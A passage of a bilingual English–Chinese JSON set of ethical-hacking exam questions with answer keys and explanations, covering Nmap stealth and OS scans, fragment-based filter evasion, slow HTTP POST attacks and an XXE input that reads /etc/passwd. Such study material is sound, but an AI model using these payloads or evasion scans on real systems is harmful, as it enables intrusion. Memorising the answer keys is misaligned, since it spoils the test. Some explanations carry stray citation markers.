    "EN": "Kevin, an encryption specialist, implemented a technique that enhances the security of keys used for encryption and authentication. Using this technique, Kevin input an **initial key** to an algorithm that **generated an enhanced key that is resistant to brute-force attacks**. What is the technique employed by Kevin to improve the security of encryption keys?",
    "C": "加密專家 Kevin 實施了一種增強用於加密和身份驗證的金鑰安全性的技術。Kevin 將一個**初始金鑰**輸入到一個演算法中，該演算法**生成了一個增強的金鑰，該金鑰能抵抗暴力破解攻擊**。Kevin 用於提高加密金鑰安全性的技術是什麼？",
    "選項: A. B. C. D.": "A. Key derivation function (金鑰派生函數) B. Key reinstallation (金鑰重裝) C. A Public key infrastructure (公開金鑰基礎設施) D. Key stretching (金鑰延伸)",
    "Answer": "D",
    "Explanation": "**金鑰延伸（Key stretching）**或金鑰強化，是一種技術，它透過將金鑰輸入到計算成本高的演算法（例如 bcrypt 或 PBKDF2）中，**多次迭代**來生成一個更長、更強的**增強金鑰**，從而顯著提高暴力破解的難度。"
  },
  {
    "Question :": "237",
    "EN": "Which of the following antennas is commonly used in communications for a frequency band of 10 MHz to VHF and UHF?",
    "C": "以下哪個天線常用于 10 MHz 到 VHF 和 UHF 頻段的通訊？",
    "選項: A. B. C. D.": "A. Yagi antenna (八木天線) B. Dipole antenna (偶極天線) C. Parabolic grid antenna (拋物面格柵天線) D. Omnidirectional antenna (全向天線)",
    "Answer": "A",
    "Explanation": "**八木天線（Yagi antenna）**是一種具有高增益和方向性的天線，通常用於 **VHF 和 UHF 頻段**的通訊。"
  },
  {
    "Question :": "238",
    "EN": "Harris is attempting to identify the OS running on his target machine. He inspected the initial TTL in the IP header and the related TCP window size and obtained the following results: TTL: 64 Window Size: 5840 What is the OS running on the target machine?",
    "C": "Harris 正試圖識別其目標機器上運行的作業系統（OS）。他檢查了 IP 標頭中的初始 TTL 和相關的 TCP 視窗大小，並獲得以下結果：TTL: 64 Window Size: 5840 目標機器上運行的 OS 是什麼？",
    "選項: A. B. C. D.": "A. Solaris OS B. Windows OS C. Mac OS D. Linux OS",
    "Answer": "D",
    "Explanation": "在 OS 指紋識別中，IP 標頭中的初始 **TTL（存留時間）值**是識別 OS 的關鍵因素。**TTL 64** 是 **Linux/Unix** 系統的典型預設值，而 Windows 系統的 TTL 則通常是 128。"
  },
  {
    "Question :": "239",
    "EN": "What would you enter if you wanted to perform a **stealth scan** using Nmap?",
    "C": "如果您想使用 Nmap 執行**隱形掃描**（stealth scan），您會輸入什麼？",
    "選項: A. B. C. D.": "A. nmap -sM B. nmap -sU C. nmap -sS D. nmap -sT",
    "Answer": "C",
    "Explanation": "Nmap 中的 **`-sS`** 標誌執行 **SYN 掃描**（也稱為半開放掃描），這是一種隱形掃描技術，因為它在不完成 TCP 三向握手的情況下探測埠，降低了被目標系統日誌記錄的風險。"
  },
  {
    "Question :": "240",
    "EN": "Which of the following scanning method **splits the TCP header into several packets** and makes it difficult for packet filters to detect the purpose of the packet?",
    "C": "以下哪個掃描方法將 **TCP 標頭分成多個封包**，使封包過濾器難以偵測封包的目的？",
    "選項: A. B. C. D.": "A. ACK flag probe scanning (ACK 標誌探測掃描) B. ICMP Echo scanning (ICMP 迴響掃描) C. SYN/FIN scanning using IP fragments (使用 IP 碎片進行 SYN/FIN 掃描) D. IPID scanning (IPID 掃描)",
    "Answer": "C",
    "Explanation": "使用 **IP 碎片**（IP fragments）進行掃描是一種規避技術，它將 TCP 標頭（例如 SYN 或 FIN 封包）**分成多個小封包**，從而繞過只檢查第一個封包標頭的簡單封包過濾器。"
  },
  {
    "Question :": "241",
    "EN": "Ron, a security professional, was pen testing web applications and SaaS platforms used by his company. While testing, he found a vulnerability that allows hackers to gain unauthorized access to API objects and perform actions such as view, update, and delete sensitive data of the company. What is the API vulnerability revealed in the above scenario?",
    "C": "Ron 是一名安全專業人員，正在對他公司使用的 Web 應用程式和 SaaS 平台進行滲透測試。在測試期間，他發現了一個漏洞，允許駭客獲得對 **API 物件的未經授權存取權限**，並執行查看、更新和刪除敏感資料等操作。上述情景中揭示的 API 漏洞是什麼？",
    "選項: A. B. C. D.": "A. Code injections (程式碼注入) B. Improper use of CORS (CORS 使用不當) C. No ABAC validation (無 ABAC 驗證) D. Business logic flaws (業務邏輯缺陷)",
    "Answer": "C",
    "Explanation": "能夠在未經授權的情況下對 API 物件執行操作，這通常是**授權缺陷**。**ABAC（Attribute-Based Access Control，基於屬性的存取控制）**是一種細粒度的授權機制。**缺乏 ABAC 驗證**（No ABAC validation）表明應用程式未能根據使用者屬性正確檢查他們是否有權存取該特定 API 物件。"
  },
  {
    "Question :": "242",
    "EN": "Firewalls are the software or hardware systems that are able to control and monitor the traffic coming in and out the target network based on pre-defined set of rules. Which of the following types of firewalls can protect against **SQL injection attacks**?",
    "C": "防火牆是能夠根據預定義的規則集控制和監控進出目標網路的流量的軟體或硬體系統。以下哪種類型的防火牆可以防範 **SQL 注入攻擊**？",
    "選項: A. B. C. D.": "A. Data-driven firewall (資料驅動防火牆) B. Packet firewall (封包防火牆) C. Web application firewall (Web 應用程式防火牆) D. Stateful firewall (有狀態防火牆)",
    "Answer": "C",
    "Explanation": "**Web 應用程式防火牆（WAF）**專門在 OSI 模型的**應用層**（Layer 7）過濾 HTTP/HTTPS 流量。它可以檢查 Web 應用程式流量的內容，從而有效防範 **SQL 注入**和 XSS 等應用層攻擊。"
  },
  {
    "Question :": "243",
    "EN": "Which of the following statements is TRUE?",
    "C": "以下哪個陳述是**正確的**？",
    "選項: A. B. C. D.": "A. Packet Sniffers operate on the Layer 1 of the OSI model. (封包嗅探器在 OSI 模型的第一層運作) B. Packet Sniffers operate on Layer 2 of the OSI model. (封包嗅探器在 OSI 模型的第二層運作) C. Packet Sniffers operate on both Layer 2 & Layer 3 of the OSI model. (封包嗅探器在 OSI 模型的第二層和第三層運作) D. Packet Sniffers operate on Layer 3 of the OSI model. (封包嗅探器在 OSI 模型的第三層運作)",
    "Answer": "B",
    "Explanation": "封包嗅探器（Packet Sniffers）的**捕獲**功能主要在 OSI 模型的**資料連結層（Layer 2）**運作，因為它捕獲傳輸中的幀和 MAC 位址資訊。雖然它可以分析到更高層（如 Layer 3/IP），但其核心運作機制是在第二層。"
  },
  {
    "Question :": "244",
    "EN": "A \"Server-Side Includes\" attack refers to the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary code remotely. Which web-page **file type**, if it exists on the web server, is a **strong indication** that the server is vulnerable to this kind of attack?",
    "C": "哪個網頁**檔案類型**的存在是伺服器容易受到「伺服器端包含」攻擊的**強烈跡象**？",
    "選項: A. B. C. D.": "A. .stm B. .html C. .rss D. .cms",
    "Answer": "A",
    "Explanation": "檔案副檔名 **`.stm`**（Server-Side include Text/HTML）強烈表明 Web 伺服器已啟用 **SSI（Server-Side Includes）**指令的處理，使其容易受到 SSI 注入攻擊。"
  },
  {
    "Question :": "245",
    "EN": "An audacious attacker is targeting a web server you oversee. He intends to perform a **Slow HTTP POST attack**, by manipulating 'a' HTTP connection. Each connection sends a byte of data every 'b' second, effectively holding up the connections for an extended period. Your server is designed to manage 'm' connections per second, but any connections exceeding this number tend to overwhelm the system. Given $a=100$ and variable $m$, along with the attacker's intention of maximizing the attack duration $D=a \cdot b$, consider the following scenarios. Which is most likely to result in the **longest duration of server unavailability**?",
    "C": "一個大膽的攻擊者正在鎖定您監督的 Web 伺服器。他打算執行 **Slow HTTP POST 攻擊**，操控 $a$ 個 HTTP 連線。每個連線每 $b$ 秒發送一個位元組的資料，從而有效地延長了連線時間。您的伺服器設計為每秒管理 $m$ 個連線。給定 $a=100$ 且 $m$ 可變，以及攻擊者的目的是最大化攻擊持續時間 $D=a \cdot b$，哪種情景最有可能導致**最長的伺服器不可用持續時間**？",
    "選項: A. B. C. D.": "A. $m=110, b=20$: 伺服器可以處理 110 個連線/秒，因此可能保持運作 B. $m=90, b=15$: 伺服器可以處理 90 個連線/秒，但攻擊者的 100 個連線超出此數量，並且每個連線保持 15 秒，攻擊持續時間可能很長 C. $m=95, b=10$: 伺服器可以處理 95 個連線/秒，但攻擊者的 100 個連線超出此數量，儘管每個連線的保持時間較低 D. $m=105, b=12$: 伺服器可以管理 105 個連線/秒，多於攻擊者的 100 個連線，可能維持運作",
    "Answer": "B",
    "Explanation": "Slow HTTP POST 攻擊旨在**使 $a$ 超過 $m$**（即 $a>m$），從而使伺服器不堪重負。在 $a>m$ 的情況下，攻擊持續時間 $D$ 由**保持連線時間 $b$** 決定。在 $a=100$ 的情況下：A. $m=110$ ($a<m$)，可能不會崩潰。B. $m=90$ ($a>m$)，保持時間 $b=15$。C. $m=95$ ($a>m$)，保持時間 $b=10$。D. $m=105$ ($a<m$)，可能不會崩潰。在可能崩潰的情景（B 和 C）中，**B 的保持時間 $b=15$ 秒最長**，因此最有可能導致**最長的伺服器不可用持續時間**。"
  },
  {
    "Question :": "246",
    "EN": "Which of the following web vulnerabilities would an attacker be attempting to exploit if they delivered the following input? `<!DOCTYPE blah [ < IENTITY trustme SYSTEM \"file:///etc/passwd\" > ] >`",
    "C": "如果攻擊者發送以下輸入，他們將嘗試利用以下哪個 Web 漏洞？`<!DOCTYPE blah [ < IENTITY trustme SYSTEM \"file:///etc/passwd\" > ] >`",
    "選項: A. B. C. D.": "A. XXE B. SQLi C. IDOR D. XXS",
    "Answer": "A",
    "Explanation": "該輸入包含一個 **DTD（Document Type Definition）**，其中定義了一個外部實體（ENTITY），並使用 **`SYSTEM \"file:///etc/passwd\"`** 試圖讀取本地檔案。這是 **XML 外部實體注入（XXE）**攻擊的典型語法，用於讀取伺服器上的敏感檔案。"
  },
  {
    "Question :": "247",
    "EN": "The security analyst decides to use vulnerability scanning software... Which of the following **limitations of vulnerability assessment** should the analyst be **most cautious** about in this context?",
    "C": "分析師應對以下哪個**漏洞評估的限制****最為謹慎**？",
    "選項: A. B. C. D.": "A. Vulnerability scanning software is limited in its ability to perform live tests on web applications to detect errors or unexpected behavior B. Vulnerability scanning software cannot define the impact of an identified vulnerability on different business operations C. Vulnerability scanning software is limited in its ability to detect vulnerabilities at a given point in time D. Vulnerability scanning software is **not immune to software engineering flaws that might lead to serious vulnerabilities being missed**",
    "Answer": "D",
    "Explanation": "漏洞掃描軟體本身的**缺陷（flaws）**可能導致**漏報（False Negative）**，使嚴重的漏洞被遺漏。這對分析師來說是最大的風險，應最為謹慎 [cite: 8285]。"
  },
  {
    "Question :": "248",
    "EN": "Why is using **default settings** on a web - server considered a security risk, and what would be the **best initial step to mitigate** this risk?",
    "C": "為什麼在 Web 伺服器上使用**預設設定**被視為安全風險？減輕此風險的**最佳初始步驟**是什麼？",
    "選項: A. B. C. D.": "A. Default settings cause server malfunctions; simplify the settings B. Default settings allow unlimited login attempts; setup account lockout C. **Default settings reveal server software type; change these settings** D. Default settings enable auto-updates; disable and manually patch",
    "Answer": "C",
    "Explanation": "預設設定會洩露**伺服器軟體的類型和版本**。減輕此風險的最佳初始步驟是**更改這些設定**以隱藏伺服器指紋 [cite: 8311, 8314]。"
  },
  {
    "Question :": "249",
    "EN": "You have compromised a server... You aimed to identify all operating systems running on the network. However, as you attempt to fingerprint all machines in the network using the nmap syntax below, **it is not going through**... `nmap -T4 -O 10.10.0.0/24`... **QUITTING!** What seems to be wrong?",
    "C": "當您嘗試使用 Nmap 語法 `nmap -T4 -O 10.10.0.0/24` 進行指紋識別時，它無法通過並退出。出了什麼問題？",
    "選項: A. B. C. D.": "A. The nmap syntax is wrong. B. This is a common behavior for a corrupted nmap application. C. The outgoing TCP/IP fingerprinting is blocked by the host firewall. D. **OS Scan requires root privileges.**",
    "Answer": "D",
    "Explanation": "Nmap 的 **OS 偵測（-O 標誌）**需要發送底層的、特製的 TCP/IP 探測包。在 Linux/Unix 系統中，發送此類原始封包需要 **根（Root）權限**（或 `sudo` 權限）。如果使用者在 shell 中權限不足，Nmap 會退出。"
  }
]

